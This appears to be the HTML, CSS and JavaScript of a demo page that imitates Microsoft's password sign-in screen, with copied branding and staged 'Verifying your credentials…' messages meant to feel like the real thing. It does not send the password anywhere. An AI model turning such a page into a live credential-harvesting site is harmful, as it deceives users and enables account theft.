<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Crect x='1' y='1' width='10' height='10' fill='%23f25022'/%3E%3Crect x='12' y='1' width='10' height='10' fill='%237fba00'/%3E%3Crect x='1' y='12' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='12' y='12' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
            color: #1b1b1b;
        }

        .card {
            width: 100%;
            max-width: 440px;
            background: #ffffff;
            padding: 44px 44px 24px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            position: relative;
            min-height: 480px;
        }

        /* ---------- FORM VIEW ---------- */
        .form-view.hidden {
            display: none;
        }

        .ms-logo {
            width: 108px;
            height: auto;
            margin-bottom: 16px;
        }

        .heading {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 16px;
        }

        /* Account display (the "email chip" but in Microsoft style) */
        .account-row {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 16px;
            cursor: pointer;
            width: fit-content;
            max-width: 100%;
            border-radius: 4px;
            padding: 2px 4px;
            transition: background 0.12s ease;
        }

        .account-row:hover {
            background: #f3f2f1;
        }

        .account-row .email-text {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-weight: 400;
        }

        .account-row .chevron {
            width: 14px;
            height: 14px;
            flex-shrink: 0;
            color: #605e5c;
        }

        .field-wrap {
            position: relative;
            margin-bottom: 4px;
        }

        .password-input {
            width: 100%;
            padding: 8px 12px;
            font-size: 15px;
            font-family: inherit;
            color: #1b1b1b;
            background: #ffffff;
            border: 1px solid #8a8886;
            border-radius: 2px;
            outline: none;
            height: 36px;
            transition: border-color 0.12s ease;
            border-bottom-width: 2px;
            border-bottom-color: #1b1b1b;
        }

        .password-input:hover {
            border-color: #323130;
            border-bottom-color: #323130;
        }

        .password-input:focus {
            border-color: #0067b8;
            border-bottom-color: #0067b8;
        }

        .password-input.error {
            border-color: #a80000;
            border-bottom-color: #a80000;
        }

        .error-text {
            display: none;
            font-size: 13px;
            color: #a80000;
            margin: 8px 0 4px;
            align-items: center;
            gap: 6px;
        }

        .error-text.visible {
            display: flex;
        }

        .error-text svg {
            width: 14px;
            height: 14px;
            flex-shrink: 0;
        }

        .forgot-link {
            display: inline-block;
            font-size: 14px;
            color: #0067b8;
            text-decoration: none;
            margin: 16px 0 24px;
        }

        .forgot-link:hover {
            text-decoration: underline;
            color: #004578;
        }

        /* Microsoft sign-in button */
        .signin-btn {
            width: 100%;
            background: #0067b8;
            color: #ffffff;
            font-size: 15px;
            font-family: inherit;
            font-weight: 400;
            border: none;
            border-radius: 2px;
            padding: 10px 12px;
            height: 36px;
            cursor: pointer;
            transition: background 0.12s ease;
        }

        .signin-btn:hover {
            background: #005da6;
        }

        .signin-btn:active {
            background: #004578;
        }

        /* Secondary options row */
        .secondary-row {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-top: 32px;
        }

        .secondary-btn {
            flex: 1;
            background: #ffffff;
            color: #1b1b1b;
            font-size: 14px;
            font-family: inherit;
            border: 1px solid #8a8886;
            border-radius: 2px;
            padding: 8px 12px;
            height: 36px;
            cursor: pointer;
            transition: background 0.12s ease, border-color 0.12s ease;
        }

        .secondary-btn:hover {
            background: #f3f2f1;
            border-color: #323130;
        }

        /* ---------- LOADING VIEW ---------- */
        .loading-view {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 60px 0 40px;
            min-height: 400px;
        }

        .loading-view.visible {
            display: flex;
        }

        .loading-view .ms-logo {
            margin-bottom: 44px;
        }

        /* Microsoft-style dot spinner */
        .ms-spinner {
            position: relative;
            width: 44px;
            height: 44px;
            margin-bottom: 28px;
        }

        .ms-spinner span {
            position: absolute;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #0067b8;
            top: 50%;
            left: 50%;
            margin: -5px 0 0 -5px;
            opacity: 0;
            animation: ms-orbit 1.8s cubic-bezier(0.5, 0, 0.5, 1) infinite;
        }

        .ms-spinner span:nth-child(1) { animation-delay: 0s; }
        .ms-spinner span:nth-child(2) { animation-delay: 0.225s; background: #4c9cd6; }
        .ms-spinner span:nth-child(3) { animation-delay: 0.45s; background: #8ac0e3; }
        .ms-spinner span:nth-child(4) { animation-delay: 0.675s; background: #b8d9ee; }
        .ms-spinner span:nth-child(5) { animation-delay: 0.9s; background: #d6e9f5; }

        @keyframes ms-orbit {
            0% {
                transform: translate(0, -18px) scale(0.6);
                opacity: 0;
            }
            20% {
                opacity: 1;
            }
            60% {
                transform: translate(0, 0) scale(1);
                opacity: 1;
            }
            100% {
                transform: translate(0, 0) scale(0.4);
                opacity: 0;
            }
        }

        .loading-text {
            font-size: 15px;
            color: #605e5c;
            font-weight: 400;
            text-align: center;
        }

        /* Footer help/legal strip */
        .ms-footer {
            width: 100%;
            max-width: 440px;
            display: flex;
            justify-content: flex-end;
            padding: 12px 4px 0;
            font-size: 12px;
            color: #605e5c;
        }

        .ms-footer a {
            color: #605e5c;
            text-decoration: none;
            margin-left: 16px;
        }

        .ms-footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            body {
                padding: 0;
                justify-content: flex-start;
                background: #ffffff;
            }
            .card {
                box-shadow: none;
                padding: 24px 24px 16px;
                min-height: auto;
            }
            .loading-view {
                min-height: 300px;
            }
        }
    </style>
</head>
<body>

    <div class="card">

        <!-- ================= FORM VIEW ================= -->
        <div class="form-view" id="formView">
            <!-- Microsoft logo (four squares + wordmark) -->
            <svg class="ms-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
                <rect x="0" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="11" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="11" y="12" width="10" height="10" fill="#ffb900"/>
                <text x="26" y="19" font-family="Segoe UI, sans-serif" font-size="18" font-weight="600" fill="#5e5e5e">Microsoft</text>
            </svg>

            <h1 class="heading" id="heading">Sign in</h1>

            <div class="account-row" id="accountChip" title="Switch account">
                <span class="email-text" id="chipEmail">loading...</span>
                <svg class="chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>

            <div class="field-wrap">
                <input
                    class="password-input"
                    id="password"
                    type="password"
                    placeholder="Password"
                    autocomplete="current-password"
                    aria-label="Password"
                >
            </div>

            <p class="error-text" id="errorText">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/>
                    <line x1="12" y1="7" x2="12" y2="13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
                    <circle cx="12" cy="16.5" r="1" fill="currentColor"/>
                </svg>
                <span id="errorMessage">Your account or password is incorrect.</span>
            </p>

            <a href="#" class="forgot-link" id="forgotLink">Forgot my password</a>

            <button class="signin-btn" id="signinBtn" type="button">Sign in</button>

            <div class="secondary-row">
                <button class="secondary-btn" id="backBtn" type="button">Back</button>
                <button class="secondary-btn" id="otherAccountBtn" type="button">Other account</button>
            </div>
        </div>

        <!-- ================= LOADING VIEW ================= -->
        <div class="loading-view" id="loadingView">
            <svg class="ms-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
                <rect x="0" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="11" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="11" y="12" width="10" height="10" fill="#ffb900"/>
                <text x="26" y="19" font-family="Segoe UI, sans-serif" font-size="18" font-weight="600" fill="#5e5e5e">Microsoft</text>
            </svg>

            <div class="ms-spinner" aria-hidden="true">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>

            <p class="loading-text" id="loadingText">Signing in…</p>
        </div>

    </div>

    <div class="ms-footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy &amp; cookies</a>
        <a href="#">•••</a>
    </div>

    <script>
        // ---- Read the email from the URL query string ----
        const params = new URLSearchParams(window.location.search);
        const rawEmail = params.get('email') || '';
        const email = rawEmail.trim().toLowerCase();

        // If no email was passed, send the user back to email.html
        if (!email) {
            window.location.replace('email.html');
        }

        // ---- Populate the account row ----
        const chipEmail = document.getElementById('chipEmail');
        chipEmail.textContent = email;

        // ---- Show / hide password (Microsoft doesn't do the eye icon, but we keep the field simple) ----
        const passwordInput = document.getElementById('password');
        const errorText = document.getElementById('errorText');
        const errorMessage = document.getElementById('errorMessage');

        // ---- Views ----
        const formView = document.getElementById('formView');
        const loadingView = document.getElementById('loadingView');
        const loadingText = document.getElementById('loadingText');

        function showLoading() {
            formView.classList.add('hidden');
            loadingView.classList.add('visible');
            loadingText.textContent = 'Signing in…';
        }

        // ---- Validate + submit ----
        const signinBtn = document.getElementById('signinBtn');

        function showError(msg) {
            errorMessage.textContent = msg || 'Your account or password is incorrect.';
            errorText.classList.add('visible');
            passwordInput.classList.add('error');
            passwordInput.focus();
        }

        function clearError() {
            errorText.classList.remove('visible');
            passwordInput.classList.remove('error');
        }

        passwordInput.addEventListener('input', clearError);

        signinBtn.addEventListener('click', () => {
            const pwd = passwordInput.value;
            if (!pwd) {
                showError('Please enter your password.');
                return;
            }
            if (pwd.length < 8) {
                showError('Your password must be at least 8 characters.');
                return;
            }

            // Show the Microsoft-style loading screen
            showLoading();

            // Staged loading messages to feel more like real Microsoft sign-in
            const steps = [
                { delay: 700,  text: 'Verifying your credentials…' },
                { delay: 1400, text: 'Signing you in…' },
                { delay: 2100, text: 'Preparing your account…' }
            ];

            steps.forEach(step => {
                setTimeout(() => {
                    loadingText.textContent = step.text;
                }, step.delay);
            });

            // After the loading sequence, go to success page
            setTimeout(() => {
                window.location.href = 'success.html?email=' + encodeURIComponent(email);
            }, 2800);
        });

        passwordInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                signinBtn.click();
            }
        });

        // ---- Back button: return to email.html ----
        document.getElementById('backBtn').addEventListener('click', () => {
            window.location.href = 'email.html';
        });

        // ---- Other account: return to email.html ----
        document.getElementById('otherAccountBtn').addEventListener('click', () => {
            window.location.href = 'email.html';
        });

        // ---- Account chip: return to email.html ----
        document.getElementById('accountChip').addEventListener('click', () => {
            window.location.href = 'email.html';
        });

        // ---- Forgot link: no-op for now ----
        document.getElementById('forgotLink').addEventListener('click', (e) => {
            e.preventDefault();
            alert('Password reset is not available in this demo.');
        });
    </script>
</body>
</html>
